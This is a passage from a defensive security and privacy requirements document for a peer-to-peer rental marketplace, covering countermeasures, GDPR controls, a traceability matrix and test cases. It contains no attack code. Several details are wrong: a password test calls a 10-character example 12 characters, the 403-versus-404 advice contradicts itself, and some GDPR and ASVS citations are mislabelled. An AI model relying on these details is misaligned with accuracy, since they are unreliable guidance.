Platform operators decide to build a "trustworthiness score" for recommendation algorithm. Algorithm downranks users with low ratings. But they also observe: "Users with non-Western names have avg 4.1 stars; users with Western names have avg 4.5 stars." They don't act on this explicitly, but the algorithm learns the bias. Soon, users named "Ahmed" and "Priya" are shown fewer item recommendations. Their listings appear lower in search results. They earn less. Months later, class action lawsuit: "Platform discriminates in recommendations based on protected characteristics inferred from rating patterns."

**Affected data subjects:** Users from underrepresented groups
**Privacy By Design principle violated:** Principle 1 (Proactive Not Reactive) — discrimination risk not identified upfront. Principle 7 (User Privacy) — secondary use of data (ratings) for algorithmic decisions without consent.
**Regulatory exposure:** GDPR Art. 5(1)(b) Purpose Limitation; Art. 21 Right to Object to automated decision-making; Art. 22 Automated decision-making (if algorithm makes binding decisions); potential violation of EU Equal Treatment Directives; civil discrimination claims under employment/consumer law.

---

## 6. Counter-Use Cases

### 6.1 Security Use Cases (Countermeasures)

#### SUC-001: MFA and Rate-Limited Login
**Mitigates:** SAC-001 (Brute Force Account Takeover)
**Security control:**
- Require email/password login
- Enforce rate limiting: max 5 login attempts per email per 15 minutes; progressively increase delay
- Require MFA (TOTP or email-based) for account creation and sensitive actions (approve rental, change email)
- Log all login attempts (success and failure) for audit trail

**Implementation notes:**
- Use TOTP (Google Authenticator) or email-based OTP (simple for MVP)
- Implement rate limiting via Redis or database counter
- Send MFA code via email; code valid for 10 minutes, single-use
- Log to audit table with timestamp, IP, user agent
- Consider "trusted device" cookie (valid 30 days) to reduce MFA friction

**OWASP ASVS reference:** ASVS 4.0 §2.1 (Authentication), §2.2.1 (MFA), §2.5 (Credential management)
**Residual risk:** Attacker compromises user's email account; can reset password via email link. Mitigate with backup codes given at MFA setup.

---

#### SUC-002: Secure Session Management
**Mitigates:** SAC-002 (Session Hijacking)
**Security control:**
- Generate session token with secure random (256-bit entropy)
- Store token in HttpOnly, Secure, SameSite=Strict cookie
- Token expires after 24 hours of inactivity or absolute 7 days
- Implement token rotation: generate new token on each request or every request with sensitive action
- Server-side session store (Redis or database) maps token to user ID, IP, user agent
- On each request, verify token; if IP/user agent changes, require re-authentication

**Implementation notes:**
- Use framework's built-in session management if secure (e.g., Rails sessions, Django sessions with Secure flag)
- Cookie flags: `HttpOnly; Secure; SameSite=Strict; Path=/`
- Client-side: never access session cookie with `document.cookie`
- Logout: delete token from server-side store immediately

**OWASP ASVS reference:** ASVS 4.0 §2.3 (Session management); §7.1 (General HTTP security)
**Residual risk:** Token stored in browser memory (for SPA) is more vulnerable to XSS. Mitigate XSS first (SUC-003).

---

#### SUC-003: Input Sanitization and Output Encoding
**Mitigates:** SAC-002 (XSS in Messaging), SAC-004 (SQL Injection)
**Security control:**
- All user input (search, messages, profiles) validated on server side
- For data stored (messages, profiles): sanitize HTML tags; convert user input to plaintext or allow safe subset (bold, italics only via Markdown)
- For data displayed: HTML-encode output (convert `<` to `&lt;`, `"` to `&quot;`)
- For SQL queries: use parameterized queries (prepared statements) exclusively; never concatenate user input into query strings
- For API responses: JSON-encode output; never return raw HTML

**Implementation notes:**
- Backend: Use DOMPurify (Node.js) or similar HTML sanitizer; enforce via library, not custom code
- For messages: store as plaintext or Markdown; render as safe HTML using markdown-it with sanitize plugin
- Database: Use ORM (Rails, Django, Sequelize) which parameterizes by default; if raw SQL, use placeholders: `SELECT * FROM items WHERE title = ?`
- Frontend: React/Vue auto-escape by default; ensure JSX doesn't use `dangerouslySetInnerHTML` for user content

**OWASP ASVS reference:** ASVS 4.0 §5.3 (Output encoding); §5.1 (Input validation)
**Residual risk:** Context-specific encoding (URL, CSS, JavaScript) requires careful handling. Use libraries, not custom logic.

---

#### SUC-004: Authorization Checks on All Sensitive Endpoints
**Mitigates:** SAC-003 (Payment Fraud), SAC-006 (IDOR to Read Messages)
**Security control:**
- Every endpoint that modifies or accesses user data requires authorization check
- Rental approval endpoint: verify requester is the item owner (check item.user_id == current_user_id)
- Message retrieval: verify requester is sender or recipient
- Profile update: verify requester is profile owner
- Implement least privilege: only return data the user is authorized to see
- Use consistent authorization pattern throughout API (e.g., authorization middleware)

**Implementation notes:**
- Middleware: `check_authorization(resource, action, user)` on all protected routes
- Example: `GET /api/rentals/:id` — middleware checks user is lender or borrower
- Return 403 Forbidden (not 404) if user not authorized; never leak existence of resource
- Log authorization failures for audit trail

**OWASP ASVS reference:** ASVS 4.0 §4.1 (Authorization); OWASP Top 10 A01:2021 – Broken Access Control
**Residual risk:** Authorization logic bugs (race conditions, logic errors). Mitigate with comprehensive test coverage.

---

#### SUC-005: Item Condition Attestation with Photos
**Mitigates:** SAC-003 (Unverified Item Damage Disputes)
**Security control:**
- Require photo evidence of item condition at key points:
  - Lender uploads condition photos when listing item
  - Borrower confirms condition receipt at pickup (takes photo)
  - Borrower uploads condition photos at return (before returning)
  - Lender confirms receipt and final condition (takes photo)
- All photos timestamped, GPS-tagged (optional, privacy concern), stored securely
- Dispute workflow: both parties can view condition history; stripe/support team uses photos to adjudicate
- Automatic detection: if photos show obvious damage between pickup and return, flag for review

**Implementation notes:**
- Mobile: Require camera access; embed timestamp in image metadata
- Cloud storage: Use S3 or similar with encryption; set lifecycle policies to delete photos after dispute resolution
- Dispute system: Side-by-side photo viewer showing condition at each stage
- Limitation: Damage that's not visible in photos (e.g., internal wear) is still hard to prove

**OWASP ASVS reference:** Not strictly ASVS, but aligns with non-repudiation (audit logging with photo evidence)
**Residual risk:** Photos can be faked; attackers with photo editing skills can manipulate evidence. Blockchain timestamping could mitigate, but out of scope for MVP.

---

#### SUC-006: Rate Limiting on API Endpoints
**Mitigates:** SAC-005 (Spam Messaging), DoS attacks
**Security control:**
- Implement per-user rate limits on:
  - Login attempts: 5 per 15 minutes
  - Message sends: 20 per hour per recipient (not globally; prevents spam to one user)
  - Search queries: 100 per minute (prevent enumeration attacks)
  - Rental request creation: 10 per day per user (prevent spam requests)
- Return 429 Too Many Requests when limit exceeded; include Retry-After header
- Log rate limit breaches; alert on suspicious patterns (rapid requests from same IP)

**Implementation notes:**
- Use Redis for rate limit counters (fast, distributed)
- Middleware: `rateLimit(action, user, limit, window)` on routes
- Fingerprinting: Rate limit by user ID (authenticated) or IP + user agent (unauthenticated)
- Monitoring: Alert if single user hits rate limit 10+ times in 1 hour (sign of attack)

**OWASP ASVS reference:** ASVS 4.0 §11.2 (Business logic); OWASP Top 10 A05:2021 – Security Misconfiguration
**Residual risk:** Distributed rate limit bypasses (attacker uses multiple IPs). Mitigate with bot detection (captcha on repeated failures).

---

#### SUC-007: Comprehensive Audit Logging
**Mitigates:** SAC-007 (Insufficient Logging / Non-repudiation)
**Security control:**
- Log all sensitive actions with immutable records:
  - User login/logout, MFA use
  - Rental request creation, approval, decline
  - Payment processing (amount, status, Stripe transaction ID)
  - Ratings submitted, edited, deleted
  - Messages sent (metadata only, not content)
  - Account changes (email, password, profile)
- Include in log: timestamp, user ID, action, resource ID, status (success/failure), IP address, user agent
- Store logs in append-only database or immutable log service (e.g., AWS CloudTrail, Sumologic)
- Retain logs for 2 years (regulatory requirement); encrypt at rest

**Implementation notes:**
- Log table: `action_logs(id, timestamp, user_id, action, resource_id, resource_type, status, ip, user_agent)`
- Trigger: Database trigger or application-layer logging
- Queryable: Support audit queries like "Show all rental approvals by user_id 123"
- Security: Restrict log access to authorized personnel only; don't log sensitive data (passwords, payment tokens)

**OWASP ASVS reference:** ASVS 4.0 §7.1 (Log content), §7.2 (Log processing)
**Residual risk:** Logs are only useful if reviewed. Establish process to review suspicious logs weekly.

---

#### SUC-008: Encrypted Messaging at Rest
**Mitigates:** SAC-001 (Data Breach from Plaintext Messages)
**Security control:**
- Messages encrypted at rest using AES-256
- Encryption key: Master key stored in key management service (AWS KMS, HashiCorp Vault)
- Decryption: Only on demand when user retrieves message; decrypt in memory, never log plaintext
- Metadata (sender, recipient, timestamp) not encrypted (needed for queries)
- End-to-end encryption (optional for MVP): Client-side encryption before sending; server can't read message

**Implementation notes:**
- Database field: `messages(id, sender_id, recipient_id, timestamp, ciphertext, iv)`
- Library: `crypto.aes.encrypt(message_text, master_key, iv)` before inserting
- Decryption: On API call to fetch messages, decrypt in memory before returning
- E2EE (harder): Use TweetNaCl.js or libsodium; share public key with recipient; client decrypts
- Retention: Delete messages after 90 days (privacy policy); automatic job triggers deletion

**OWASP ASVS reference:** ASVS 4.0 §2.4 (Credential storage); §6.2 (Secrets)
**Residual risk:** Encryption key compromise leaks all messages. Mitigation: rotate keys periodically; audit key access.

---

### 6.2 Privacy Use Cases (Privacy Controls)

#### PUC-001: Clear, Layered Privacy Notice
**Mitigates:** PAC-005 (Non-compliance with transparency), PAC-006 (Unawareness)
**Privacy control:**
- Display privacy notice *before* signup; make it mandatory to read summary
- Privacy notice includes:
  - What personal data is collected (email, name, address, location, photos, messages, ratings)
  - Why each data is collected (legal basis: contract for payment, consent for location, legitimate interest for trust ratings)
  - Who data is shared with (Stripe, email service, optional analytics)
  - How long data is retained (messages 90 days, ratings permanent, account data until deletion request)
  - User rights (access, erasure, portability, objection)
  - Contact for privacy questions
- Layered: Summary on signup; full policy at `/privacy`; summary reminder in settings
- Language: Plain English, not legalese; short paragraphs, examples

**Implementation notes:**
- Signup flow: Show 1-sentence summary; checkbox "I agree to privacy terms"; link to full policy
- Settings: Add "Data & Privacy" section with links to: Privacy Policy, Data Request (export), Delete Account, Download Conversations
- Format: HTML page or PDF; mobile-friendly; search-indexed for transparency

**GDPR article reference:** Art. 13 (Information to be provided at time of collection); Recital 58 (Transparency)
**Residual risk:** Users don't read privacy notices. Mitigation: layered approach with summaries reduces risk.

---

#### PUC-002: Data Minimisation & Purpose Limitation
**Mitigates:** PAC-001 (Behaviour Profiling), PAC-006 (Secondary Use)
**Privacy control:**
- Collect only data necessary for stated purpose:
  - Phone number: optional (nice to have for contact, but not required to rent/lend)
  - Full address: not required; use postal code only for location-based search
  - Item photos: required to show condition, but don't store metadata (GPS, device info)
  - Messages: store only text and metadata; don't store read receipts or typing indicators (unnecessary)
- Explicit purpose for each data type in privacy notice
- Restrict secondary use: Ratings can't be used for automated decision-making; Stripe data not used for marketing without opt-in
- Data sharing: Only share with Stripe what's necessary for payment (amount, user email, not address)

**Implementation notes:**
- Data collection checklist: For each field, ask "Is this required for the feature?" If no, make optional.
- API to Stripe: Send only (amount, currency, email); don't send (address, item description, user profile)
- Analytics: Don't track granular user behaviour (e.g., which items each user searches for) without opt-in
- Code review: Reject PRs that collect extra data without documented purpose

**GDPR article reference:** Art. 5(1)(b) Purpose Limitation; Art. 5(1)(c) Data Minimisation
**Residual risk:** Pressure to collect more data for product features (recommendations, insights). Mitigation: require privacy review for new data collection.

---

#### PUC-003: Retention Policy & Automated Deletion
**Mitigates:** PAC-005 (Non-compliance with Storage Limitation)
**Privacy control:**
- Documented data retention policy:
  - Messages: Deleted after 90 days (unless dispute in progress; then retain until resolved)
  - Ratings/reviews: Permanent (non-repudiation; lender/borrower have right to know history) but linked to user ID, not name
  - Account data (email, name, address, phone): Deleted within 30 days of deletion request, with exceptions for legal/tax obligations
  - Audit logs: Retained 2 years (regulatory)
  - Payment records: Retained per Stripe's policy (likely 7 years for tax)
- Automated jobs: Cron jobs to delete old messages, anonymize deleted user data
- User-initiated deletion: "Delete Account" button triggers immediate email confirmation; data deleted after 7 days (grace period)
- Backup retention: Data in backups deleted after primary data deletion + 30 days (allow time for restores)

**Implementation notes:**
- Database: Add `deleted_at` column to track soft deletes; hard delete after 30 days
- Job: `DELETE FROM messages WHERE created_at < NOW() - INTERVAL '90 days' AND dispute_id IS NULL` (daily)
- User deletion: Send confirmation email with 7-day undo link; after 7 days, hard delete user record
- Stripe: Don't explicitly delete from Stripe (they handle retention); note in privacy policy

**GDPR article reference:** Art. 5(1)(e) Storage Limitation; Art. 17 Right to Erasure
**Residual risk:** Backups may be retained longer. Mitigation: document backup retention in privacy policy.

---

#### PUC-004: Data Subject Rights Portal
**Mitigates:** PAC-005 (Non-compliance with Data Rights)
**Privacy control:**
- Implement self-service portal for data subject rights:
  - **Right to Access (Art. 15):** "Download my data" button exports user data (email, profile, conversations, ratings) as JSON/CSV
  - **Right to Erasure (Art. 17):** "Delete my account" button; triggers retention policy from PUC-003
  - **Right to Portability (Art. 20):** Same export as Access; format is machine-readable (JSON)
  - **Right to Rectification (Art. 16):** Edit profile, email, address in settings
  - **Right to Object (Art. 21):** "Opt out of recommendations" checkbox to disable algorithmic profiling
- Request form: If user requests rights via support email, acknowledge within 10 days; fulfill within 30 days
- Log all data requests in audit trail

**Implementation notes:**
- UI: Settings > "Your Data" with 4 buttons (Access, Erase, Portability, Objection)
- Access/Portability: Generate JSON file with schema documenting each field; email as downloadable link
- Erase: Trigger account deletion workflow; delete from primary DB, then from backups per retention policy
- Objection: Set flag on user account; disable recommendations, behavior-based features; document consent withdrawal
- Support process: Create template for responding to rights requests via email (GDPR Art. 12)

**GDPR article reference:** Art. 12–22 (Data Subject Rights); Art. 15 (Access), Art. 17 (Erasure), Art. 20 (Portability), Art. 16 (Rectification), Art. 21 (Objection)
**Residual risk:** Process delays or errors. Mitigation: set internal SLA (10 days for acknowledgment, 30 days for fulfillment); audit compliance monthly.

---

#### PUC-005: Location Privacy Controls
**Mitigates:** PAC-002 (Location-Based Doxing), PT-002 (Identifiability)
**Privacy control:**
- Location data granularity:
  - Users enter postal code, not street address (coarse-grained)
  - Search results show postal code distance, not exact address
  - Item listings show "5 km away," not GPS coordinates
  - Lender address (for pickup) only revealed *after* rental is approved (not in listing)
- Privacy options (future):
  - "Hide my location" toggle: disable location-based search for this user (borrowers can't find items near them)
  - "Use pickup point" option: lender can specify public location (e.g., community center) instead of home
  - "Borrower-managed delivery" option: lender doesn't share address; borrower arranges delivery via third party

**Implementation notes:**
- Database: Store location as postal code + lat/long (hidden from API unless lender approves rental)
- Search: Calculate distance using postal codes; don't expose lat/long in JSON responses
- Pickup details: Only revealed in rental approval notification and in-app after approval
- Settings: Allow users to review and change location every time they log in

**GDPR article reference:** Art. 5(1)(c) Data Minimisation; Art. 32 Security (special care for location data); Art. 35 DPIA (location processing triggers DPIA)
**Residual risk:** Sophisticated attacker can still dox users via profile + photos. Mitigation: educate users to avoid unique items; moderation of suspicious profiles.

---

#### PUC-006: Messaging Privacy & Retention
**Mitigates:** PAC-004 (Data Breach), PT-005 (Unencrypted Disclosure)
**Privacy control:**
- Encryption: Messages encrypted at rest (SUC-008); stored encrypted in database
- Retention: Auto-delete after 90 days (PUC-003); users can manually delete conversations
- User control: "Clear conversation" option in chat UI; applies to both sender and recipient; hard-delete from database
- Notification: When user opens app, show: "Messages older than 90 days are automatically deleted"
- No backup: Messages not backed up; only operational data backed up
- Audit: Message-related actions logged (send, delete, view) in audit trail, but not message content

**Implementation notes:**
- Client: Add "Delete conversation" button in chat UI; deletes from both sides
- Server: `DELETE FROM messages WHERE (sender_id = user_id OR recipient_id = user_id) AND created_at < NOW() - INTERVAL '90 days'` (daily cron)
- Encryption: See SUC-008
- Backup: `excluded_tables = ['messages']` in backup config; or back up with encryption key unavailable

**GDPR article reference:** Art. 5(1)(e) Storage Limitation; Art. 32 Security; Art. 25 Data Protection by Design
**Residual risk:** Backup restores could restore old messages. Mitigation: strict backup access control; document in policy.

---

#### PUC-007: Algorithmic Fairness & Transparency
**Mitigates:** PAC-006 (Discrimination via Algorithmic Bias)
**Privacy control:**
- Recommendation algorithm (if implemented):
  - Disclose use of ratings/behaviour in recommendations: "Items ranked by popularity and relevance, not by user reputation"
  - Audit for bias: Monthly check for disparate impact (do recommendations show lower-rated users less frequently?)
  - Opt-out: "Opt out of personalized recommendations" checkbox; show unranked results to users with opt-out
  - Explainability: Optional "Why was this shown to me?" explanation (e.g., "Popular in your area", "Similar to past searches")
- No automated decisions: Don't auto-ban users, auto-hide listings, or apply restrictions based solely on algorithmic scores (e.g., low rating)
- Human review: Disputes triggered by algorithm require manual review before enforcement

**Implementation notes:**
- Algorithm: Use simple, explainable signals (item popularity, category match, distance) rather than opaque neural networks
- Audit: Measure recommendation system for bias using standard metrics (disparate impact ratio)
- Logging: Track which recommendations each user received; audit for systematic bias
- Privacy notice: Disclose "We rank items using popularity and relevance. You can opt out of personalized recommendations in Settings."

**GDPR article reference:** Art. 22 Automated Decision-Making; Art. 13 (information about automated processing); Art. 21 (right to object)
**Residual risk:** Bias in rating data itself (users from underrepresented groups receive lower ratings due to prejudice). Mitigation: Community guidelines and moderation of ratings.

---

## 7. Refined Requirements

### Functional Requirements

| Req ID | Requirement | Notes |
|--------|-------------|-------|
| FR-001 | Users can list items with photos, availability calendar, and daily rental price | Original |
| FR-002 | Borrowers can search items by location and category | Original |
| FR-003 | Borrowers can request to rent; lenders can approve/decline | Original |
| FR-004 | Payment is handled by Stripe (system never touches card data directly) | Original |
| FR-005 | Both parties rate each other after a transaction | Original |
| FR-006 | Users can message each other within the app | Original |
| FR-007 | Profile page shows public rating, listed items, and member since date | Original |
| FR-008 | [NEW — from SUC-005] Item condition attestation: borrower confirms condition at pickup/return with timestamped photos | Dispute prevention |
| FR-009 | [NEW — from PUC-003] User can delete their account; triggers data deletion workflow | Data subject right |
| FR-010 | [NEW — from PUC-004] User can export their data (email, messages, ratings) as JSON | Data subject right (portability) |
| FR-011 | [NEW — from PUC-003] Admin: system automatically deletes messages older than 90 days | Retention policy automation |
| FR-012 | [NEW — from SUC-007] System logs all sensitive actions (login, rental approval, payment, rating, account changes) for audit trail | Non-repudiation |

### Security Non-Functional Requirements

| Req ID | Requirement | Notes |
|--------|-------------|-------|
| SEC-001 | [NEW] Authentication: All users must authenticate with email + password. Password must meet OWASP guidelines (min 12 characters, complexity). | Prevent account takeover; mitigates ST-001 |
| SEC-002 | [NEW] Multi-Factor Authentication: MFA (TOTP or email OTP) required for account creation and sensitive actions (rental approval, account deletion). | Prevent account takeover; mitigates ST-001, SAC-001 |
| SEC-003 | [NEW] Rate Limiting: Login: max 5 attempts per 15 min per email. Message sends: 20 per hour per recipient. Search: 100 per minute per user. Rental requests: 10 per day per user. | Prevent brute force, spam, enumeration; mitigates ST-001, ST-006, SAC-001, SAC-005 |
| SEC-004 | [NEW] Session Management: Sessions stored in HttpOnly, Secure, SameSite=Strict cookies. Token expires after 24h of inactivity or 7 days absolute. IP/user agent validation on each request. | Prevent session hijacking; mitigates ST-002, SAC-002 |
| SEC-005 | [NEW] Input Validation: All user input (search, messages, profiles, item descriptions) validated server-side. HTML sanitized for safe storage. | Prevent XSS, SQL injection; mitigates ST-003, ST-004, SAC-002, SAC-004 |
| SEC-006 | [NEW] Output Encoding: All user-generated content HTML-encoded when displayed. API responses JSON-encoded. | Prevent XSS; mitigates ST-004, SAC-002 |
| SEC-007 | [NEW] Parameterized Queries: All SQL queries use parameterized statements (prepared statements); no string concatenation with user input. | Prevent SQL injection; mitigates ST-003, SAC-004 |
| SEC-008 | [NEW] Authorization Checks: Every endpoint that accesses or modifies user data verifies requester is authorized. Returns 403 Forbidden if not authorized. | Prevent IDOR, privilege escalation; mitigates ST-005, ST-009, SAC-003, SAC-006 |
| SEC-009 | [NEW] Encryption in Transit: All traffic uses TLS 1.2+. HSTS header set (min-age 31536000). | Prevent eavesdropping; mitigates ST-002, ST-010 |
| SEC-010 | [NEW] Encryption at Rest: Messages encrypted with AES-256. Encryption key stored in secure key management service (AWS KMS or Vault). | Prevent data breach; mitigates ST-010, PAC-004 |
| SEC-011 | [NEW] Secrets Management: API keys, database credentials, Stripe keys stored in secrets manager (AWS Secrets Manager, .env with strict access). Not hardcoded. | Prevent credential leakage; mitigates various threats |
| SEC-012 | [NEW] Audit Logging: All sensitive actions logged (login, rental approval, payment, rating, account changes) with timestamp, user, resource, status, IP, user agent. Logs retained 2 years. | Enable incident response, dispute resolution, non-repudiation; mitigates ST-007 |
| SEC-013 | [NEW] Error Handling: Error messages don't leak sensitive information (user existence, database schema, stack traces). Generic error message shown to user; detailed logs on server. | Prevent information disclosure; mitigates ST-001 |

### Privacy Non-Functional Requirements

| Req ID | Requirement | Notes |
|--------|-------------|-------|
| PRV-001 | [NEW] Privacy Notice: Clear, layered privacy notice provided before signup. Includes data collected, purposes, sharing, retention, user rights. Updated annually. | GDPR Art. 13 (transparency); mitigates PAC-005, PT-009 |
| PRV-002 | [NEW] Lawful Basis Documentation: For each data processing activity, document the lawful basis (contract, consent, legitimate interest, legal obligation). | GDPR Art. 6 (lawfulness); mitigates PT-009 |
| PRV-003 | [NEW] Consent for Optional Data: Phone number, profile photo, location granularity — all optional with explicit opt-in. User must consent before collection. | GDPR Recital 32 (consent); mitigates PAC-005, PT-009 |
| PRV-004 | [NEW] Data Minimisation: Collect only data necessary for stated purpose. Phone number optional. Location stored as postal code, not street address. Stripe data minimised (amount, email only). | GDPR Art. 5(1)(c) (data minimisation); mitigates PAC-001, PAC-006, PT-001, PT-004 |
| PRV-005 | [NEW] Retention Policy: Messages deleted after 90 days (unless dispute active). Ratings permanent, but linked to user ID not name. Account data deleted within 30 days of deletion request (with legal exceptions). Audit logs retained 2 years. Payment records per Stripe policy. | GDPR Art. 5(1)(e) (storage limitation); mitigates PT-008, PAC-005 |
| PRV-006 | [NEW] Automated Deletion: Cron jobs delete messages older than 90 days daily. Account deletion triggers hard delete from primary DB; soft delete from backups after 30 days. | Implementation of PRV-005 |
| PRV-007 | [NEW] Data Subject Rights Portal: Users can exercise rights via self-service: (1) Access — download data as JSON, (2) Erasure — delete account, (3) Portability — export as JSON, (4) Rectification — edit profile, (5) Objection — opt out of recommendations. | GDPR Art. 12–22 (data subject rights); mitigates PAC-005 |
| PRV-008 | [NEW] Right to Erasure Process: Support team acknowledges erasure requests within 10 days; fulfills within 30 days. Documented SLA and audit trail. | GDPR Art. 12 (right to erasure); mitigates PAC-005 |
| PRV-009 | [NEW] Third-Party Data Processing Agreement: Signed Data Processing Agreement (DPA) with Stripe before processing personal data. Stripe DPA available to users. | GDPR Art. 28 (processor agreement); mitigates PT-006 |
| PRV-010 | [NEW] Location Privacy: Location stored as postal code, not street address. Search results show "distance" not GPS. Lender address only revealed after rental approval. Option for users to hide location. | GDPR Art. 32 (security for location); mitigates PT-002, PAC-002 |
| PRV-011 | [NEW] Messaging Encryption & Retention: Messages encrypted at rest (AES-256). Auto-delete after 90 days. User can manually delete conversations. | GDPR Art. 5(1)(e), Art. 32 (encryption); mitigates PAC-004, PT-005 |
| PRV-012 | [NEW] Algorithmic Fairness: If recommendations implemented, disclose use of ratings in ranking. Monthly bias audit. Users can opt out of personalized recommendations. No automated bans based solely on algorithmic score. | GDPR Art. 22 (automated decision-making); mitigates PAC-006 |
| PRV-013 | [NEW] Breach Detection & Notification: System logs security events (failed login, rate limit breach, unauthorized access attempt). Incident response plan defines 72-hour breach notification timeline (GDPR Art. 33). | GDPR Art. 33–34 (breach notification); mitigates PAC-004 |

### Compliance / Regulatory Requirements

| Req ID | Requirement | Notes |
|--------|-------------|-------|
| COMP-001 | [NEW] GDPR Compliance: Ensure all processing complies with GDPR Art. 5 (lawfulness, fairness, transparency, data minimisation, storage limitation, integrity & confidentiality). | Foundational |
| COMP-002 | [NEW] Data Protection Impact Assessment (DPIA): Conduct DPIA for high-risk processing (location + ratings + messaging). Document risks and mitigations. | GDPR Art. 35 (DPIA for high-risk processing) |
| COMP-003 | [NEW] Terms of Service: Document dispute resolution process (how claims of item damage are handled). Liability limitations (platform not responsible for item loss). Acceptable use policy (no harassment, illegal activity). | Risk management; mitigates SAC-003 |
| COMP-004 | [NEW] PCI-DSS Scope: Confirm that system does not store, process, or transmit credit card data. All card data handled by Stripe (PCI-DSS Level 1). | Regulatory requirement; mitigates SAC-003 |

### Performance Requirements

| Req ID | Requirement | Notes |
|--------|-------------|-------|
| PERF-001 | [NEW] Availability: System uptime target 99% (monthly SLA). Graceful degradation if search service is down (show cached results). | Non-critical but good to state |

---

## 8. Security Requirements Traceability Matrix

| Req ID | Requirement (brief) | Type | Use Case | Threat / Abuse Case | Control (SUC / PUC) | Test ID | Test Description | Priority |
|--------|---------------------|------|----------|---------------------|---------------------|---------|------------------|----------|
| SEC-001 | Authentication: email + password with OWASP guidelines | SEC | UC-001, UC-005, UC-007 | ST-001, SAC-001 | SUC-001 | TA-001 | Unit test: password validation enforces min 12 chars, complexity | Critical |
| SEC-002 | MFA (TOTP/email OTP) for account creation and sensitive actions | SEC | UC-001, UC-005 | ST-001, SAC-001 | SUC-001 | TA-002 | Integration test: MFA flow (generate code, verify OTP) | Critical |
| SEC-003 | Rate limiting (login, messages, search, requests) | SEC | UC-001, UC-004, UC-006 | ST-001, ST-006, SAC-001, SAC-005 | SUC-006 | TA-003 | Security attack test: brute force login blocked; 429 on limit | Critical |
| SEC-004 | Session management (HttpOnly cookie, expiry, IP validation) | SEC | All | ST-002, SAC-002 | SUC-002 | TA-004 | Functional test: session expires after inactivity; IP change re-authenticates | Critical |
| SEC-005 | Input validation (server-side for all user input) | SEC | UC-002, UC-003, UC-006, UC-008 | ST-003, ST-004, SAC-002, SAC-004 | SUC-003 | TA-005 | Unit test: search query sanitized; HTML tags stripped; JSON escapes | High |
| SEC-006 | Output encoding (HTML-encode, JSON-encode) | SEC | UC-006, UC-008 | ST-004, SAC-002 | SUC-003 | TA-006 | Functional test: XSS payload in message doesn't execute; rendered as text | High |
| SEC-007 | Parameterized SQL queries | SEC | UC-003 | ST-003, SAC-004 | SUC-003 | TA-007 | Security attack test: SQL injection payload in search returns no results; no error leak | High |
| SEC-008 | Authorization checks on all endpoints | SEC | UC-004, UC-005, UC-006, UC-008 | ST-005, ST-009, SAC-003, SAC-006 | SUC-004 | TA-008 | Integration test: user cannot approve another user's rental; 403 returned | Critical |
| SEC-009 | TLS 1.2+, HSTS header | SEC | All | ST-002 | SUC-002 | TA-009 | Functional test: all endpoints redirect HTTP to HTTPS; HSTS header present | High |
| SEC-010 | Message encryption at rest (AES-256) | SEC | UC-006 | ST-010, PAC-004 | SUC-008 | TA-010 | Privacy verification test: message in database is encrypted; plaintext not found | High |
| SEC-011 | Secrets management (API keys in secrets manager) | SEC | FR-004 (Stripe) | Various | SUC-001 | TA-011 | Code review: no hardcoded credentials; all keys in env or secrets manager | High |
| SEC-012 | Audit logging (all sensitive actions) | SEC | UC-001, UC-005, UC-007 | ST-007, PAC-005 | SUC-007 | TA-012 | Functional test: rental approval creates audit log entry; logged action queryable | High |
| SEC-013 | Error handling (no sensitive info leakage) | SEC | All | ST-001, ST-003 | SUC-003 | TA-013 | Functional test: 404 error doesn't reveal user existence; 500 doesn't leak stack trace | Medium |
| PRV-001 | Privacy notice (layered, before signup) | PRV | UC-001 | PT-009, PAC-005 | PUC-001 | TA-014 | Privacy verification test: privacy notice visible on signup page; link to full policy | Critical |
| PRV-002 | Lawful basis documentation | PRV | UC-001, UC-003, FR-004 | PT-009 | PUC-001 | TA-015 | Manual audit: lawful basis for each data type documented in privacy policy | High |
| PRV-004 | Data minimisation (phone optional, postal code only) | PRV | UC-001, UC-002, UC-003 | PT-001, PT-004, PAC-001, PAC-002 | PUC-002 | TA-016 | Code review: signup doesn't require phone; search uses postal code, not street address | High |
| PRV-005 | Retention policy (90 days messages, permanent ratings, 30 days account data) | PRV | UC-006, UC-007, UC-001 | PT-008, PAC-005 | PUC-003 | TA-017 | Privacy verification test: messages older than 90 days are deleted; audit log shows deletion | High |
| PRV-007 | Data subject rights portal (access, erasure, portability, rectification, objection) | PRV | UC-001 | PAC-005 | PUC-004 | TA-018 | Functional test: user can download data; delete account; export as JSON | Critical |
| PRV-010 | Location privacy (postal code, hidden until approval) | PRV | UC-002, UC-003, UC-005 | PT-002, PAC-002 | PUC-005 | TA-019 | Functional test: search results don't show street address; lender location only visible after approval | High |
| PRV-011 | Message encryption & retention (AES-256, 90 days, manual delete) | PRV | UC-006 | PAC-004, PT-005 | PUC-006, SUC-008 | TA-020 | Privacy verification test: messages encrypted at rest; auto-delete after 90 days; manual delete removes from both sides | High |
| FR-008 | Item condition attestation (photos at pickup/return) | FR | UC-005 | ST-008, SAC-003 | SUC-005 | TA-021 | Integration test: rental approval requires pickup photo; return requires return photo | High |
| FR-009 | Account deletion (user-initiated, triggers data deletion) | FR | UC-001 | PAC-005 | PUC-003 | TA-022 | Functional test: user can delete account; email confirmation required; account data deleted within 7 days | High |
| FR-010 | Data export (access/portability) | FR | UC-001 | PAC-005 | PUC-004 | TA-023 | Functional test: user can export data as JSON; includes email, profile, messages, ratings | High |
| FR-011 | Auto-delete messages after 90 days | FR | UC-006 | PT-008 | PUC-003 | TA-024 | Functional test: cron job deletes messages older than 90 days; audit log shows deletion | Medium |
| FR-012 | Audit logging | FR | UC-001, UC-005, UC-007 | ST-007 | SUC-007 | TA-025 | Functional test: all sensitive actions logged; audit log searchable by user/action/time | High |
| COMP-002 | DPIA for high-risk processing | COMP | UC-003, UC-006, UC-007 | PT-001, PT-002, PAC-001, PAC-002, PAC-006 | PUC-001 | TA-026 | Manual: DPIA document completed; risks and mitigations documented | High |

---

## 9. Test Artifacts

### 9.1 Functional Security Tests

#### TA-001: Password Validation Unit Test
**Type:** Functional Security Test
**Requirement(s):** SEC-001
**Scenario:** Verify password validation enforces OWASP guidelines (min 12 characters, character complexity).
**Test approach:** Unit test
**Expected outcome:**
- Password "password" → rejected (too short, no complexity)
- Password "Pass123!@#" → accepted (12 chars, uppercase, lowercase, number, symbol)
- Password "PASS123456" → rejected (no lowercase/symbol)

**Automation potential:** High

---

#### TA-002: MFA Flow Integration Test
**Type:** Functional Security Test
**Requirement(s):** SEC-002
**Scenario:** Test MFA flow for account creation (email OTP) and sensitive action (rental approval TOTP).
**Test approach:** Integration test
**Expected outcome:**
- Signup: user enters email → system sends OTP → user enters OTP → account created
- Approval: user requests MFA code → system sends TOTP code → user enters code → approval authorized
- Invalid/expired code → request rejected

